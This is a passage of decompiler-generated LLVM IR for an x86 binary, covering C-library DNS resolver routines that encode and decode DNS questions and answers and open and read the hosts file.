  %v2_8053d53 = add i32 %v1_8053d53, 16
  %v3_8053d53 = inttoptr i32 %v2_8053d53 to i32*
  store i32 %v1_8053d50, i32* %v3_8053d53, align 4
  %v0_8053d56 = load i32, i32* @ecx, align 4
  %v1_8053d56 = add i32 %v0_8053d56, 2
  %v2_8053d56 = inttoptr i32 %v1_8053d56 to i8*
  %v3_8053d56 = load i8, i8* %v2_8053d56, align 1
  %tmp10 = urem i8 %v3_8053d56, 2
  %v1_8053d5a = zext i8 %tmp10 to i32
  %v1_8053d5d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d5d = add i32 %v1_8053d5d, 20
  %v3_8053d5d = inttoptr i32 %v2_8053d5d to i32*
  store i32 %v1_8053d5a, i32* %v3_8053d5d, align 4
  %v0_8053d60 = load i32, i32* @ecx, align 4
  %v1_8053d60 = add i32 %v0_8053d60, 3
  %v2_8053d60 = inttoptr i32 %v1_8053d60 to i8*
  %v3_8053d60 = load i8, i8* %v2_8053d60, align 1
  %tmp11 = icmp slt i8 %v3_8053d60, 0
  %v2_8053d64 = zext i1 %tmp11 to i32
  %v1_8053d67 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d67 = add i32 %v1_8053d67, 24
  %v3_8053d67 = inttoptr i32 %v2_8053d67 to i32*
  store i32 %v2_8053d64, i32* %v3_8053d67, align 4
  %v0_8053d6a = load i32, i32* @ecx, align 4
  %v1_8053d6a = add i32 %v0_8053d6a, 3
  %v2_8053d6a = inttoptr i32 %v1_8053d6a to i8*
  %v3_8053d6a = load i8, i8* %v2_8053d6a, align 1
  %tmp12 = urem i8 %v3_8053d6a, 16
  %v1_8053d6e = zext i8 %tmp12 to i32
  %v1_8053d71 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d71 = add i32 %v1_8053d71, 28
  %v3_8053d71 = inttoptr i32 %v2_8053d71 to i32*
  store i32 %v1_8053d6e, i32* %v3_8053d71, align 4
  %v0_8053d74 = load i32, i32* @ecx, align 4
  %v1_8053d74 = add i32 %v0_8053d74, 4
  %v2_8053d74 = inttoptr i32 %v1_8053d74 to i8*
  %v3_8053d74 = load i8, i8* %v2_8053d74, align 1
  %v4_8053d74 = zext i8 %v3_8053d74 to i32
  %v1_8053d78 = add i32 %v0_8053d74, 5
  %v2_8053d78 = inttoptr i32 %v1_8053d78 to i8*
  %v3_8053d78 = load i8, i8* %v2_8053d78, align 1
  %v4_8053d78 = zext i8 %v3_8053d78 to i32
  %v2_8053d7c = mul nuw nsw i32 %v4_8053d74, 256
  %v2_8053d7f = or i32 %v4_8053d78, %v2_8053d7c
  %v1_8053d81 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d81 = add i32 %v1_8053d81, 32
  %v3_8053d81 = inttoptr i32 %v2_8053d81 to i32*
  store i32 %v2_8053d7f, i32* %v3_8053d81, align 4
  %v0_8053d84 = load i32, i32* @ecx, align 4
  %v1_8053d84 = add i32 %v0_8053d84, 6
  %v2_8053d84 = inttoptr i32 %v1_8053d84 to i8*
  %v3_8053d84 = load i8, i8* %v2_8053d84, align 1
  %v4_8053d84 = zext i8 %v3_8053d84 to i32
  %v1_8053d88 = add i32 %v0_8053d84, 7
  %v2_8053d88 = inttoptr i32 %v1_8053d88 to i8*
  %v3_8053d88 = load i8, i8* %v2_8053d88, align 1
  %v4_8053d88 = zext i8 %v3_8053d88 to i32
  %v2_8053d8c = mul nuw nsw i32 %v4_8053d84, 256
  %v2_8053d8f = or i32 %v4_8053d88, %v2_8053d8c
  %v1_8053d91 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053d91 = add i32 %v1_8053d91, 36
  %v3_8053d91 = inttoptr i32 %v2_8053d91 to i32*
  store i32 %v2_8053d8f, i32* %v3_8053d91, align 4
  %v0_8053d94 = load i32, i32* @ecx, align 4
  %v1_8053d94 = add i32 %v0_8053d94, 8
  %v2_8053d94 = inttoptr i32 %v1_8053d94 to i8*
  %v3_8053d94 = load i8, i8* %v2_8053d94, align 1
  %v4_8053d94 = zext i8 %v3_8053d94 to i32
  %v1_8053d98 = add i32 %v0_8053d94, 9
  %v2_8053d98 = inttoptr i32 %v1_8053d98 to i8*
  %v3_8053d98 = load i8, i8* %v2_8053d98, align 1
  %v4_8053d98 = zext i8 %v3_8053d98 to i32
  %v2_8053d9c = mul nuw nsw i32 %v4_8053d94, 256
  %v2_8053d9f = or i32 %v4_8053d98, %v2_8053d9c
  %v1_8053da1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053da1 = add i32 %v1_8053da1, 40
  %v3_8053da1 = inttoptr i32 %v2_8053da1 to i32*
  store i32 %v2_8053d9f, i32* %v3_8053da1, align 4
  %v0_8053da4 = load i32, i32* @ecx, align 4
  %v1_8053da4 = add i32 %v0_8053da4, 10
  %v2_8053da4 = inttoptr i32 %v1_8053da4 to i8*
  %v3_8053da4 = load i8, i8* %v2_8053da4, align 1
  %v4_8053da4 = zext i8 %v3_8053da4 to i32
  %v1_8053da8 = add i32 %v0_8053da4, 11
  %v2_8053da8 = inttoptr i32 %v1_8053da8 to i8*
  %v3_8053da8 = load i8, i8* %v2_8053da8, align 1
  %v4_8053da8 = zext i8 %v3_8053da8 to i32
  %v2_8053dac = mul nuw nsw i32 %v4_8053da4, 256
  %v2_8053daf = or i32 %v4_8053da8, %v2_8053dac
  %v1_8053db1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053db1 = add i32 %v1_8053db1, 44
  %v3_8053db1 = inttoptr i32 %v2_8053db1 to i32*
  store i32 %v2_8053daf, i32* %v3_8053db1, align 4
  %v2_8053db9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053db9, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 13, 14, 4, 5, 9, 10, 15, 7, 2, 11, 12, 0, 6, 3, 8, 1 }
  uselistorder i32 40, { 8, 9, 3, 11, 12, 13, 10, 0, 1, 4, 5, 6, 7, 2 }
  uselistorder i32 7, { 18, 19, 3, 6, 4, 0, 2, 7, 14, 15, 16, 17, 5, 1, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 6, { 25, 26, 2, 3, 21, 22, 0, 6, 18, 14, 15, 8, 28, 16, 23, 24, 4, 1, 5, 7, 12, 13, 17, 20, 9, 19, 10, 11, 27 }
  uselistorder i32 28, { 34, 35, 17, 18, 36, 25, 48, 47, 40, 41, 2, 42, 43, 44, 45, 46, 3, 4, 5, 0, 26, 16, 19, 20, 37, 38, 27, 28, 29, 30, 31, 32, 1, 33, 49, 39, 21, 22, 23, 6, 7, 24, 12, 11, 9, 10, 13, 14, 8, 15 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 3, 1, 4, 5, 2 }
  uselistorder i8 16, { 0, 1, 2, 6, 7, 8, 3, 4, 5 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8053dbc = load i32, i32* @edi, align 4
  %v0_8053dbd = load i32, i32* @esi, align 4
  %v0_8053dbe = load i32, i32* @ebx, align 4
  store i32 %v0_8053dbe, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8053dcb = load i32, i32* @eax, align 4
  %v1_8053dce = inttoptr i32 %tmp3 to i32*
  %v2_8053dce = load i32, i32* %v1_8053dce, align 4
  %v7_8053dd0 = inttoptr i32 %v2_8053dce to i8*
  %v8_8053dd0 = call i32 @__encode_dotted(i8* %v7_8053dd0, i32 %tmp2, i32 %tmp, i32 %v0_8053dcb, i32 %v0_8053dbe, i32 %v0_8053dbd, i32 %v0_8053dbc)
  store i32 %v8_8053dd0, i32* @ecx, align 4
  %v2_8053dda = icmp slt i32 %v8_8053dd0, 0
  br i1 %v2_8053dda, label %dec_label_pc_8053e09, label %dec_label_pc_8053dde

dec_label_pc_8053dde:                             ; preds = %entry
  %v0_8053dde = load i32, i32* @ebx, align 4
  %v2_8053dde = sub i32 %v0_8053dde, %v8_8053dd0
  %v1_8053de0 = add i32 %v2_8053dde, -3
  %v6_8053de0 = sub i32 2, %v2_8053dde
  %v7_8053de0 = and i32 %v6_8053de0, %v2_8053dde
  %v8_8053de0 = icmp slt i32 %v7_8053de0, 0
  %v9_8053de0 = icmp eq i32 %v1_8053de0, 0
  %v10_8053de0 = icmp slt i32 %v1_8053de0, 0
  %v3_8053de3 = icmp eq i1 %v10_8053de0, %v8_8053de0
  %v4_8053de3 = icmp eq i1 %v9_8053de0, false
  %v5_8053de3 = and i1 %v4_8053de3, %v3_8053de3
  br i1 %v5_8053de3, label %dec_label_pc_8053dea, label %dec_label_pc_8053de5

dec_label_pc_8053de5:                             ; preds = %dec_label_pc_8053dde
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8053e09

dec_label_pc_8053dea:                             ; preds = %dec_label_pc_8053dde
  %v0_8053dea = load i32, i32* @edi, align 4
  %v2_8053dea = add i32 %v0_8053dea, %v8_8053dd0
  store i32 %v2_8053dea, i32* @edx, align 4
  %v1_8053ded = add i32 %v8_8053dd0, 4
  store i32 %v1_8053ded, i32* @ecx, align 4
  %v0_8053df0 = load i32, i32* @esi, align 4
  %v1_8053df0 = add i32 %v0_8053df0, 5
  %v2_8053df0 = inttoptr i32 %v1_8053df0 to i8*
  %v3_8053df0 = load i8, i8* %v2_8053df0, align 1
  %v3_8053df4 = inttoptr i32 %v2_8053dea to i8*
  store i8 %v3_8053df0, i8* %v3_8053df4, align 1
  %v0_8053df6 = load i32, i32* @esi, align 4
  %v1_8053df6 = add i32 %v0_8053df6, 4
  %v2_8053df6 = inttoptr i32 %v1_8053df6 to i32*
  %v3_8053df6 = load i32, i32* %v2_8053df6, align 4
  %v1_8053df9 = trunc i32 %v3_8053df6 to i8
  %v2_8053df9 = load i32, i32* @edx, align 4
  %v3_8053df9 = add i32 %v2_8053df9, 1
  %v4_8053df9 = inttoptr i32 %v3_8053df9 to i8*
  store i8 %v1_8053df9, i8* %v4_8053df9, align 1
  %v0_8053dfc = load i32, i32* @esi, align 4
  %v1_8053dfc = add i32 %v0_8053dfc, 9
  %v2_8053dfc = inttoptr i32 %v1_8053dfc to i8*
  %v3_8053dfc = load i8, i8* %v2_8053dfc, align 1
  %v2_8053e00 = load i32, i32* @edx, align 4
  %v3_8053e00 = add i32 %v2_8053e00, 2
  %v4_8053e00 = inttoptr i32 %v3_8053e00 to i8*
  store i8 %v3_8053dfc, i8* %v4_8053e00, align 1
  %v0_8053e03 = load i32, i32* @esi, align 4
  %v1_8053e03 = add i32 %v0_8053e03, 8
  %v2_8053e03 = inttoptr i32 %v1_8053e03 to i32*
  %v3_8053e03 = load i32, i32* %v2_8053e03, align 4
  %v1_8053e06 = trunc i32 %v3_8053e03 to i8
  %v2_8053e06 = load i32, i32* @edx, align 4
  %v3_8053e06 = add i32 %v2_8053e06, 3
  %v4_8053e06 = inttoptr i32 %v3_8053e06 to i8*
  store i8 %v1_8053e06, i8* %v4_8053e06, align 1
  %v0_8053e09.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053e09

dec_label_pc_8053e09:                             ; preds = %entry, %dec_label_pc_8053de5, %dec_label_pc_8053dea
  %v0_8053e09 = phi i32 [ %v8_8053dd0, %entry ], [ -1, %dec_label_pc_8053de5 ], [ %v0_8053e09.pre, %dec_label_pc_8053dea ]
  %v2_8053e0b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053e0b, i32* @ebx, align 4
  store i32 %v0_8053dbc, i32* @edi, align 4
  ret i32 %v0_8053e09

; uselistorder directives
  uselistorder i32 %v1_8053de0, { 1, 0 }
  uselistorder i32 %v2_8053dde, { 0, 2, 1 }
  uselistorder i32 %v8_8053dd0, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053e09, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8053e1b = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8053e23 = icmp slt i32 %v2_8053e1b, 0
  br i1 %v2_8053e23, label %dec_label_pc_8053e2a, label %dec_label_pc_8053e27

dec_label_pc_8053e27:                             ; preds = %entry
  %v1_8053e27 = add i32 %v2_8053e1b, 4
  br label %dec_label_pc_8053e2a

dec_label_pc_8053e2a:                             ; preds = %entry, %dec_label_pc_8053e27
  %v0_8053e2d = phi i32 [ %v2_8053e1b, %entry ], [ %v1_8053e27, %dec_label_pc_8053e27 ]
  ret i32 %v0_8053e2d

; uselistorder directives
  uselistorder label %dec_label_pc_8053e2a, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053e30 = load i32, i32* @ebp, align 4
  %v0_8053e31 = load i32, i32* @edi, align 4
  %v0_8053e32 = load i32, i32* @esi, align 4
  %v0_8053e33 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e33, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8053e54 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8053e61 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8053e54, i32 256)
  store i32 %v4_8053e61, i32* @edi, align 4
  %v3_8053e6b = icmp slt i32 %v4_8053e61, 0
  br i1 %v3_8053e6b, label %dec_label_pc_8053f1c, label %dec_label_pc_8053e73

dec_label_pc_8053e73:                             ; preds = %entry
  %v0_8053e73 = load i32, i32* @ebx, align 4
  %v3_8053e73 = add i32 %v0_8053e73, %v4_8053e61
  %v0_8053e75 = load i32, i32* @esi, align 4
  %v2_8053e75 = sub i32 %v0_8053e75, %v3_8053e73
  %v1_8053e7b = add i32 %v2_8053e75, -10
  %v10_8053e7b = icmp slt i32 %v1_8053e7b, 0
  store i32 %v1_8053e7b, i32* @esi, align 4
  %v1_8053e82 = icmp eq i1 %v10_8053e7b, false
  br i1 %v1_8053e82, label %dec_label_pc_8053e8b, label %dec_label_pc_8053e84

dec_label_pc_8053e84:                             ; preds = %dec_label_pc_8053e73
  br label %dec_label_pc_8053f1c

dec_label_pc_8053e8b:                             ; preds = %dec_label_pc_8053e73
  %v6_8053e92 = add i32 %v3_8053e73, %tmp4
  store i32 %v6_8053e92, i32* @ebx, align 4
  %v1_8053e9e = bitcast i32* %stack_var_-272 to i8*
  %v2_8053e9e = call i32 @__GI_strdup(i8* %v1_8053e9e)
  %v1_8053ea3 = load i32, i32* @ebp, align 4
  %v2_8053ea3 = inttoptr i32 %v1_8053ea3 to i32*
  store i32 %v2_8053e9e, i32* %v2_8053ea3, align 4
  %v0_8053ea6 = load i32, i32* @ebx, align 4
  %v1_8053ea6 = add i32 %v0_8053ea6, 4
  store i32 %v1_8053ea6, i32* %esi.global-to-local, align 4
  %v1_8053ea9 = inttoptr i32 %v0_8053ea6 to i8*
  %v2_8053ea9 = load i8, i8* %v1_8053ea9, align 1
  %v3_8053ea9 = zext i8 %v2_8053ea9 to i32
  %v1_8053eac = add i32 %v0_8053ea6, 1
  %v2_8053eac = inttoptr i32 %v1_8053eac to i8*
  %v3_8053eac = load i8, i8* %v2_8053eac, align 1
  %v4_8053eac = zext i8 %v3_8053eac to i32
  %v2_8053eb0 = mul nuw nsw i32 %v3_8053ea9, 256
  %v2_8053eb3 = or i32 %v4_8053eac, %v2_8053eb0
  %v1_8053eb5 = load i32, i32* @ebp, align 4
  %v2_8053eb5 = add i32 %v1_8053eb5, 4
  %v3_8053eb5 = inttoptr i32 %v2_8053eb5 to i32*
  store i32 %v2_8053eb3, i32* %v3_8053eb5, align 4
  %v0_8053eb8 = load i32, i32* @ebx, align 4
  %v1_8053eb8 = add i32 %v0_8053eb8, 2
  %v2_8053eb8 = inttoptr i32 %v1_8053eb8 to i8*
  %v3_8053eb8 = load i8, i8* %v2_8053eb8, align 1
  %v4_8053eb8 = zext i8 %v3_8053eb8 to i32
  %v1_8053ebc = add i32 %v0_8053eb8, 3
  %v2_8053ebc = inttoptr i32 %v1_8053ebc to i8*
  %v3_8053ebc = load i8, i8* %v2_8053ebc, align 1
  %v4_8053ebc = zext i8 %v3_8053ebc to i32
  %v2_8053ec0 = mul nuw nsw i32 %v4_8053eb8, 256
  %v2_8053ec3 = or i32 %v4_8053ebc, %v2_8053ec0
  %v1_8053ec5 = load i32, i32* @ebp, align 4
  %v2_8053ec5 = add i32 %v1_8053ec5, 8
  %v3_8053ec5 = inttoptr i32 %v2_8053ec5 to i32*
  store i32 %v2_8053ec3, i32* %v3_8053ec5, align 4
  %v0_8053ec8 = load i32, i32* @ebx, align 4
  %v1_8053ec8 = add i32 %v0_8053ec8, 4
  %v2_8053ec8 = inttoptr i32 %v1_8053ec8 to i8*
  %v3_8053ec8 = load i8, i8* %v2_8053ec8, align 1
  %v4_8053ec8 = zext i8 %v3_8053ec8 to i32
  %v0_8053ecc = load i32, i32* %esi.global-to-local, align 4
  %v1_8053ecc = add i32 %v0_8053ecc, 1
  %v2_8053ecc = inttoptr i32 %v1_8053ecc to i8*
  %v3_8053ecc = load i8, i8* %v2_8053ecc, align 1
  %v4_8053ecc = zext i8 %v3_8053ecc to i32
  %v2_8053ed0 = mul nuw i32 %v4_8053ec8, 16777216
  %v2_8053ed3 = mul nuw nsw i32 %v4_8053ecc, 65536
  %v1_8053ed6 = add i32 %v0_8053ecc, 2
  %v2_8053ed6 = inttoptr i32 %v1_8053ed6 to i8*
  %v3_8053ed6 = load i8, i8* %v2_8053ed6, align 1
  %v4_8053ed6 = zext i8 %v3_8053ed6 to i32
  %v2_8053eda = mul nuw nsw i32 %v4_8053ed6, 256
  %v2_8053edd = or i32 %v2_8053ed3, %v2_8053ed0
  %v1_8053edf = add i32 %v0_8053ecc, 3
  %v2_8053edf = inttoptr i32 %v1_8053edf to i8*
  %v3_8053edf = load i8, i8* %v2_8053edf, align 1
  %v4_8053edf = zext i8 %v3_8053edf to i32
  %v2_8053ee3 = or i32 %v4_8053edf, %v2_8053edd
  %v2_8053ee5 = or i32 %v2_8053ee3, %v2_8053eda
  store i32 %v2_8053ee5, i32* @ecx, align 4
  %v1_8053ee7 = load i32, i32* @ebp, align 4
  %v2_8053ee7 = add i32 %v1_8053ee7, 12
  %v3_8053ee7 = inttoptr i32 %v2_8053ee7 to i32*
  store i32 %v2_8053ee5, i32* %v3_8053ee7, align 4
  %v0_8053eea = load i32, i32* @ebx, align 4
  %v1_8053eea = add i32 %v0_8053eea, 8
  %v2_8053eea = inttoptr i32 %v1_8053eea to i8*
  %v3_8053eea = load i8, i8* %v2_8053eea, align 1
  %v4_8053eea = zext i8 %v3_8053eea to i32
  %v1_8053eee = add i32 %v0_8053eea, 9
  %v2_8053eee = inttoptr i32 %v1_8053eee to i8*
  %v3_8053eee = load i8, i8* %v2_8053eee, align 1
  %v4_8053eee = zext i8 %v3_8053eee to i32
  %v2_8053ef2 = mul nuw nsw i32 %v4_8053eea, 256
  %v1_8053ef5 = add i32 %v0_8053eea, 10
  %v2_8053ef8 = or i32 %v4_8053eee, %v2_8053ef2
  store i32 %v2_8053ef8, i32* @edx, align 4
  %v1_8053efa = load i32, i32* @ebp, align 4
  %v2_8053efa = add i32 %v1_8053efa, 20
  %v3_8053efa = inttoptr i32 %v2_8053efa to i32*
  store i32 %v1_8053ef5, i32* %v3_8053efa, align 4
  %v0_8053efd = load i32, i32* @edx, align 4
  %v1_8053efd = load i32, i32* @ebp, align 4
  %v2_8053efd = add i32 %v1_8053efd, 16
  %v3_8053efd = inttoptr i32 %v2_8053efd to i32*
  store i32 %v0_8053efd, i32* %v3_8053efd, align 4
  %v1_8053f07 = add i32 %v3_8053e73, 10
  %v1_8053f0a = load i32, i32* @ebp, align 4
  %v2_8053f0a = add i32 %v1_8053f0a, 24
  %v3_8053f0a = inttoptr i32 %v2_8053f0a to i32*
  store i32 %v1_8053f07, i32* %v3_8053f0a, align 4
  %v4_8053f0d = load i32, i32* @edx, align 4
  %v5_8053f11 = icmp slt i32 %v1_8053e7b, %v4_8053f0d
  br i1 %v5_8053f11, label %dec_label_pc_8053f13, label %dec_label_pc_8053f18

dec_label_pc_8053f13:                             ; preds = %dec_label_pc_8053e8b
  br label %dec_label_pc_8053f1c

dec_label_pc_8053f18:                             ; preds = %dec_label_pc_8053e8b
  %v1_8053f18 = load i32, i32* @edi, align 4
  %v2_8053f18 = add i32 %v4_8053f0d, 10
  %v3_8053f18 = add i32 %v2_8053f18, %v1_8053f18
  br label %dec_label_pc_8053f1c

dec_label_pc_8053f1c:                             ; preds = %entry, %dec_label_pc_8053f13, %dec_label_pc_8053e84, %dec_label_pc_8053f18
  %v0_8053f22 = phi i32 [ %v4_8053e61, %entry ], [ -1, %dec_label_pc_8053f13 ], [ %v1_8053e7b, %dec_label_pc_8053e84 ], [ %v3_8053f18, %dec_label_pc_8053f18 ]
  %v2_8053f24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053f24, i32* @ebx, align 4
  store i32 %v0_8053e32, i32* @esi, align 4
  store i32 %v0_8053e31, i32* @edi, align 4
  store i32 %v0_8053e30, i32* @ebp, align 4
  ret i32 %v0_8053f22

; uselistorder directives
  uselistorder i32 %v1_8053e7b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8053e73, { 1, 0, 2 }
  uselistorder i32 %v4_8053e61, { 1, 0, 2, 3 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 5, 10, 36, 11, 12, 13, 34, 21, 22, 23, 24, 25, 26, 27, 38, 2, 35, 14, 15, 16, 17, 18, 3, 4, 6, 7, 8, 1, 9, 28, 37 }
  uselistorder i32 20, { 34, 35, 36, 37, 5, 23, 41, 8, 42, 38, 39, 6, 24, 25, 4, 11, 12, 33, 13, 14, 15, 26, 27, 28, 0, 29, 1, 30, 9, 31, 32, 44, 40, 7, 16, 17, 18, 19, 20, 21, 22, 3, 2, 43, 10 }
  uselistorder i32 9, { 16, 17, 18, 19, 7, 20, 10, 11, 4, 9, 3, 8, 12, 13, 14, 15, 6, 5, 1, 0, 21, 22, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 46, 47, 48, 49, 50, 51, 25, 3, 26, 15, 45, 7, 52, 27, 9, 8, 4, 1, 2, 0, 28, 5, 29, 38, 16, 39, 33, 53, 17, 18, 34, 30, 14, 11, 12, 10, 13, 32, 44, 31, 35, 19, 36, 20, 37, 40, 41, 42, 43, 21, 22, 23, 24, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053f1c, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8053f39 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8058105.295 to i32), i32 ptrtoint (i32* @global_var_80580d0.283 to i32))
  store i32 %v3_8053f39, i32* @eax, align 4
  %v1_8053f41 = icmp eq i32 %v3_8053f39, 0
  %v1_8053f43 = icmp eq i1 %v1_8053f41, false
  br i1 %v1_8053f43, label %dec_label_pc_8053f59, label %dec_label_pc_8053f45

dec_label_pc_8053f45:                             ; preds = %entry
  %v3_8053f51 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8058110.296 to i32), i32 ptrtoint (i32* @global_var_80580d0.283 to i32))
  br label %dec_label_pc_8053f59

dec_label_pc_8053f59:                             ; preds = %entry, %dec_label_pc_8053f45
  %v0_8053f5c = phi i32 [ %v3_8053f39, %entry ], [ %v3_8053f51, %dec_label_pc_8053f45 ]
  ret i32 %v0_8053f5c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_80580d0.283 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8053f59, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8053f5d = load i32, i32* @ebp, align 4
  %v0_8053f5e = load i32, i32* @edi, align 4
  %v0_8053f5f = load i32, i32* @esi, align 4
  %v0_8053f60 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8053f6e = sub i32 0, %arg6
  %v1_8053f70 = urem i32 %v1_8053f6e, 4
  %v2_8053f70 = icmp eq i32 %v1_8053f70, 0
  store i32 %v1_8053f70, i32* %eax.global-to-local, align 4
  br i1 %v2_8053f70, label %dec_label_pc_8053f81, label %dec_label_pc_8053f75

dec_label_pc_8053f75:                             ; preds = %entry
  %v2_8053f75 = sub i32 %arg7, %v1_8053f70
  %v7_8053f75 = icmp ugt i32 %v1_8053f70, %arg7
  br i1 %v7_8053f75, label %dec_label_pc_8054225, label %dec_label_pc_8053f7d

dec_label_pc_8053f7d:                             ; preds = %dec_label_pc_8053f75
  %v2_8053f7d = add i32 %v1_8053f70, %arg6
  store i32 %v2_8053f7d, i32* @ebx, align 4
  store i32 %v2_8053f75, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053f81

dec_label_pc_8053f81:                             ; preds = %entry, %dec_label_pc_8053f7d
  %v0_8053f8a = phi i32 [ %arg6, %entry ], [ %v2_8053f7d, %dec_label_pc_8053f7d ]
  %v0_8053f8d = phi i32 [ %arg7, %entry ], [ %v2_8053f75, %dec_label_pc_8053f7d ]
  %tmp149 = icmp ult i32 %v0_8053f8d, 32
  br i1 %tmp149, label %dec_label_pc_8054225, label %dec_label_pc_8053f8a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053f81
  %v1_8053f8a = add i32 %v0_8053f8a, 32
  store i32 %v1_8053f8a, i32* %eax.global-to-local, align 4
  %v1_8053f8d = add i32 %v0_8053f8d, -32
  store i32 %v1_8053f8d, i32* @ebp, align 4
  %v5_8053f90 = inttoptr i32 %v1_8053f8a to i8*
  %v12_8053f94 = icmp eq i32 %arg4, 1
  br i1 %v12_8053f94, label %dec_label_pc_80540b6, label %dec_label_pc_8053f9f

dec_label_pc_8053f9f:                             ; preds = %dec_label_pc_8053f8a
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8053fa6 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8053fa6, align 4
  %tmp150 = icmp ult i32 %v1_8053f8d, 4
  br i1 %tmp150, label %dec_label_pc_8054225, label %dec_label_pc_8053fb2

dec_label_pc_8053fb2:                             ; preds = %dec_label_pc_8053f9f
  %v0_8053fb2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053fb2 = add i32 %v0_8053fb2, -36
  store i32 %v1_8053fb2, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8053fb2, 8
  br i1 %tmp151, label %dec_label_pc_8054225, label %dec_label_pc_8053fbe

dec_label_pc_8053fbe:                             ; preds = %dec_label_pc_8053fb2
  %v0_8053fbe = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8053fbe, 16
  br i1 %tmp152, label %dec_label_pc_8054225, label %dec_label_pc_8053fc7

dec_label_pc_8053fc7:                             ; preds = %dec_label_pc_8053fbe
  %v1_8053fc7 = add i32 %v0_8053fb2, -48
  store i32 %v1_8053fc7, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8053fc7, 8
  br i1 %tmp153, label %dec_label_pc_8054225, label %dec_label_pc_8053fd3

dec_label_pc_8053fd3:                             ; preds = %dec_label_pc_8053fc7
  %v0_8053fd3 = load i32, i32* @ebx, align 4
  %v1_8053fd3 = add i32 %v0_8053fd3, 48
  %v1_8053fd6 = add i32 %v0_8053fb2, -44
  store i32 %v1_8053fd6, i32* @ebp, align 4
  %v1_8053fdd = add i32 %v0_8053fb2, -56
  store i32 %v1_8053fdd, i32* @eax, align 4
  %v1_8053fe0 = add i32 %v0_8053fd3, 36
  store i32 %v1_8053fe0, i32* @edi, align 4
  %v7_8053fe3 = icmp ult i32 %v1_8053fdd, %v1_8053fd6
  br i1 %v7_8053fe3, label %dec_label_pc_8053fec, label %dec_label_pc_8053fe7

dec_label_pc_8053fe7:                             ; preds = %dec_label_pc_8053fd3
  %v1_8053fe7 = add i32 %v0_8053fd3, 44
  store i32 %v1_8053fe7, i32* @esi, align 4
  br label %dec_label_pc_8053ff1

dec_label_pc_8053fec:                             ; preds = %dec_label_pc_8053fd3
  %v1_8053fec = add i32 %v0_8053fd3, 56
  store i32 %v1_8053fec, i32* @esi, align 4
  store i32 %v1_8053fdd, i32* @ebp, align 4
  br label %dec_label_pc_8053ff1

